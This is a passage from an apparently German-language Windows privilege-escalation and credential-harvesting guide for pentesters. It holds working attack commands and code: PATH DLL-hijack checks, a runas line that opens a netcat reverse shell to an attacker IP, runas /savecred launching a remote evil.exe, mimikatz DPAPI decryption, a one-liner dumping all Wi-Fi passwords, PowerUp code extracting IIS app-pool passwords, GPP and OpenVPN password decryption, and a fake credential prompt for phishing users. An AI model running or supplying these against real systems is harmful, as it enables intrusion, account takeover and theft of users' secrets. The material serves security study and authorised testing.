Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Beim Start ausführen

**Überprüfen Sie, ob Sie einige Registrierungs- oder Binärdateien überschreiben können, die von einem anderen Benutzer ausgeführt werden.**\
**Lesen** Sie die **folgende Seite**, um mehr über interessante **Autorun-Standorte zur Eskalation von Rechten** zu erfahren:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suchen Sie nach möglichen **drittanbieter-seltsamen/anfälligen** Treibern.
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Wenn Sie **Schreibberechtigungen in einem Ordner haben, der im PATH vorhanden ist**, könnten Sie in der Lage sein, eine von einem Prozess geladene DLL zu hijacken und **Berechtigungen zu eskalieren**.

Überprüfen Sie die Berechtigungen aller Ordner im PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Für weitere Informationen darüber, wie man diese Überprüfung ausnutzen kann:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Netzwerk

### Freigaben
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Überprüfen Sie die im Hosts-Datei fest codierten anderen bekannten Computer.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netzwerkinterfaces & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Offene Ports

Überprüfen Sie **eingeschränkte Dienste** von außen
```bash
netstat -ano #Opened ports?
```
### Routing-Tabelle
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-Tabelle
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-Regeln

[**Überprüfen Sie diese Seite für firewallbezogene Befehle**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, ausschalten, ausschalten...)**

Mehr[ Befehle zur Netzwerkanalyse hier](../basic-cmd-for-pentesters.md#network)

### Windows-Subsystem für Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die Binärdatei `bash.exe` kann auch in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` gefunden werden.

Wenn Sie den Root-Benutzer erhalten, können Sie auf jedem Port lauschen (beim ersten Mal, wenn Sie `nc.exe` verwenden, um auf einem Port zu lauschen, wird über die GUI gefragt, ob `nc` von der Firewall erlaubt werden soll).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Um bash einfach als root zu starten, können Sie `--default-user root` versuchen.

Sie können das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` erkunden.

## Windows-Anmeldeinformationen

### Winlogon-Anmeldeinformationen
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Anmeldeinformationsmanager / Windows-Tresor

Von [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Der Windows-Tresor speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, bei denen **Windows** die Benutzer **automatisch anmelden kann**. Auf den ersten Blick mag es so aussehen, als könnten Benutzer ihre Facebook-Anmeldeinformationen, Twitter-Anmeldeinformationen, Gmail-Anmeldeinformationen usw. speichern, damit sie sich automatisch über Browser anmelden. Aber das ist nicht der Fall.

Der Windows-Tresor speichert Anmeldeinformationen, mit denen Windows die Benutzer automatisch anmelden kann, was bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen benötigt, um auf eine Ressource** (Server oder Website) **zuzugreifen, diesen Anmeldeinformationsmanager** & Windows-Tresor nutzen und die bereitgestellten Anmeldeinformationen verwenden kann, anstatt dass die Benutzer ständig ihren Benutzernamen und ihr Passwort eingeben.

Es sei denn, die Anwendungen interagieren mit dem Anmeldeinformationsmanager, denke ich nicht, dass es ihnen möglich ist, die Anmeldeinformationen für eine bestimmte Ressource zu verwenden. Wenn Ihre Anwendung also den Tresor nutzen möchte, sollte sie irgendwie **mit dem Anmeldeinformationsmanager kommunizieren und die Anmeldeinformationen für diese Ressource** aus dem Standardspeichertresor anfordern.

Verwenden Sie `cmdkey`, um die gespeicherten Anmeldeinformationen auf dem Computer aufzulisten.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dann können Sie `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldeinformationen zu nutzen. Das folgende Beispiel ruft eine Remote-Binärdatei über einen SMB-Freigabe auf.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verwendung von `runas` mit einem bereitgestellten Satz von Anmeldeinformationen.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Beachten Sie, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oder aus dem [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten, die hauptsächlich im Windows-Betriebssystem zur symmetrischen Verschlüsselung von asymmetrischen privaten Schlüsseln verwendet wird. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, um erheblich zur Entropie beizutragen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln durch einen symmetrischen Schlüssel, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. In Szenarien mit Systemverschlüsselung verwendet es die Authentifizierungsgeheimnisse der Domäne des Systems.

Verschlüsselte Benutzer-RSA-Schlüssel, die DPAPI verwenden, werden im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers darstellt. **Der DPAPI-Schlüssel, der zusammen mit dem Master-Schlüssel, der die privaten Schlüssel des Benutzers im selben Datei schützt, gespeichert ist**, besteht typischerweise aus 64 Bytes zufälliger Daten. (Es ist wichtig zu beachten, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist, was das Auflisten seines Inhalts über den `dir`-Befehl in CMD verhindert, obwohl es über PowerShell aufgelistet werden kann).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Sie können das **mimikatz-Modul** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **von dem Master-Passwort geschützten Anmeldeinformationen-Dateien** befinden sich normalerweise in:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Sie können das **mimikatz-Modul** `dpapi::cred` mit dem entsprechenden `/masterkey` verwenden, um zu entschlüsseln.\
Sie können **viele DPAPI** **Masterkeys** aus dem **Speicher** mit dem `sekurlsa::dpapi`-Modul extrahieren (wenn Sie Root sind).

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-Anmeldeinformationen

**PowerShell-Anmeldeinformationen** werden häufig für **Skripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldeinformationen bequem zu speichern. Die Anmeldeinformationen sind durch **DPAPI** geschützt, was normalerweise bedeutet, dass sie nur von demselben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Um **PS-Anmeldeinformationen** aus der Datei, die sie enthält, zu **entschlüsseln**, können Sie Folgendes tun:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gespeicherte RDP-Verbindungen

Sie finden sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
und in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Kürzlich ausgeführte Befehle
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Verwenden Sie das **Mimikatz** `dpapi::rdg` Modul mit dem entsprechenden `/masterkey`, um **alle .rdg-Dateien** zu **entschlüsseln**.\
Sie können **viele DPAPI-Masterkeys** aus dem Speicher mit dem Mimikatz `sekurlsa::dpapi` Modul **extrahieren**.

### Sticky Notes

Menschen verwenden oft die StickyNotes-App auf Windows-Workstations, um **Passwörter** und andere Informationen zu **speichern**, ohne zu realisieren, dass es sich um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und es lohnt sich immer, danach zu suchen und sie zu untersuchen.

### AppCmd.exe

**Beachten Sie, dass Sie Administrator sein und unter einem hohen Integritätslevel ausführen müssen, um Passwörter aus AppCmd.exe wiederherzustellen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei existiert, ist es möglich, dass einige **Anmeldeinformationen** konfiguriert wurden und **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Überprüfen Sie, ob `C:\Windows\CCM\SCClient.exe` vorhanden ist.\
Installer werden **mit SYSTEM-Rechten ausgeführt**, viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dateien und Registrierung (Anmeldeinformationen)

### Putty-Anmeldeinformationen
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH-Hostschlüssel
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-Schlüssel in der Registrierung

SSH-Private Schlüssel können im Registrierungsschlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert werden, daher sollten Sie überprüfen, ob dort etwas Interessantes vorhanden ist:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Wenn Sie einen Eintrag in diesem Pfad finden, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er wird verschlüsselt gespeichert, kann jedoch leicht mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) entschlüsselt werden.\
Weitere Informationen zu dieser Technik finden Sie hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Wenn der `ssh-agent`-Dienst nicht läuft und Sie möchten, dass er beim Booten automatisch startet, führen Sie Folgendes aus:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!NOTE]
> Es scheint, dass diese Technik nicht mehr gültig ist. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich über SSH bei einer Maschine anzumelden. Der Registrierungseintrag HKCU\Software\OpenSSH\Agent\Keys existiert nicht und Procmon hat die Verwendung von `dpapi.dll` während der asymmetrischen Schlüsselauthentifizierung nicht identifiziert.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Sie können diese Dateien auch mit **metasploit** suchen: _post/windows/gather/enum_unattend_
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM-Backups
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud-Anmeldeinformationen
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Suchen Sie nach einer Datei namens **SiteList.xml**

### Cached GPP Passwort

Eine Funktion war zuvor verfügbar, die die Bereitstellung von benutzerdefinierten lokalen Administratorkonten auf einer Gruppe von Maschinen über Gruppenrichtlinienpräferenzen (GPP) ermöglichte. Diese Methode wies jedoch erhebliche Sicherheitsmängel auf. Erstens konnten die Gruppenrichtlinienobjekte (GPOs), die als XML-Dateien in SYSVOL gespeichert sind, von jedem Domänenbenutzer zugegriffen werden. Zweitens konnten die Passwörter innerhalb dieser GPPs, die mit AES256 unter Verwendung eines öffentlich dokumentierten Standard-Schlüssels verschlüsselt sind, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein ernsthaftes Risiko dar, da es Benutzern ermöglichen konnte, erhöhte Berechtigungen zu erlangen.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die nach lokal zwischengespeicherten GPP-Dateien sucht, die ein "cpassword"-Feld enthalten, das nicht leer ist. Bei Auffinden einer solchen Datei entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details über die GPP und den Speicherort der Datei, was bei der Identifizierung und Behebung dieser Sicherheitsanfälligkeit hilft.

Suchen Sie in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor W Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Um das cPassword zu entschlüsseln:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Verwendung von crackmapexec, um die Passwörter zu erhalten:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Beispiel für web.config mit Anmeldeinformationen:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-Anmeldeinformationen
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Protokolle
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Nach Anmeldeinformationen fragen

Sie können immer **den Benutzer bitten, seine Anmeldeinformationen oder sogar die Anmeldeinformationen eines anderen Benutzers einzugeben**, wenn Sie denken, dass er sie wissen könnte (beachten Sie, dass **den** Kunden direkt nach den **Anmeldeinformationen** zu fragen, wirklich **riskant** ist):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mögliche Dateinamen mit Anmeldeinformationen**

Bekannte Dateien, die vor einiger Zeit **Passwörter** im **Klartext** oder **Base64** enthielten
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Durchsuche alle vorgeschlagenen Dateien:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Anmeldeinformationen im Papierkorb

Sie sollten auch den Papierkorb überprüfen, um nach Anmeldeinformationen darin zu suchen.

Um **Passwörter** wiederherzustellen, die von mehreren Programmen gespeichert wurden, können Sie verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Im Registrierungseditor

**Weitere mögliche Registrierungsschlüssel mit Anmeldeinformationen**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**SSH-Schlüssel aus der Registry extrahieren.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browserverlauf

Sie sollten nach Datenbanken suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert sind.\
Überprüfen Sie auch den Verlauf, Lesezeichen und Favoriten der Browser, da dort möglicherweise einige **Passwörter gespeichert sind**.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Überschreibung**

**Component Object Model (COM)** ist eine Technologie, die im Windows-Betriebssystem integriert ist und die **Interkommunikation** zwischen Softwarekomponenten verschiedener Sprachen ermöglicht. Jede COM-Komponente wird **über eine Klassen-ID (CLSID)** identifiziert, und jede Komponente bietet Funktionalität über eine oder mehrere Schnittstellen, die über Schnittstellen-IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen sind in der Registry unter **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** und **HKEY\_**_**CLASSES\_**_**ROOT\Interface** definiert. Diese Registry wird erstellt, indem **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT** zusammengeführt werden.

Innerhalb der CLSIDs dieser Registry finden Sie die untergeordnete Registry **InProcServer32**, die einen **Standardwert** enthält, der auf eine **DLL** verweist, und einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single oder Multi) oder **Neutral** (Thread Neutral) sein kann.

![](<../../images/image (729).png>)

Im Grunde genommen, wenn Sie **eine der DLLs überschreiben können**, die ausgeführt werden sollen, könnten Sie **Privilegien eskalieren**, wenn diese DLL von einem anderen Benutzer ausgeführt wird.

Um zu erfahren, wie Angreifer COM-Hijacking als Persistenzmechanismus verwenden, überprüfen Sie:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Allgemeine Passwortsuche in Dateien und Registry**

**Nach Dateiinhalten suchen**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Suchen Sie nach einer Datei mit einem bestimmten Dateinamen**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Durchsuchen Sie die Registrierung nach Schlüsselnamen und Passwörtern**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools, die nach Passwörtern suchen

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf** Plugin, das ich erstellt habe, um **automatisch jedes Metasploit POST-Modul auszuführen, das nach Anmeldeinformationen** im Opfer sucht.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die Passwörter enthalten, die auf dieser Seite erwähnt werden.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System zu extrahieren.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **Sitzungen**, **Benutzernamen** und **Passwörtern** mehrerer Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP).
```bash
Import-Module path\to\SessionGopher.ps1;
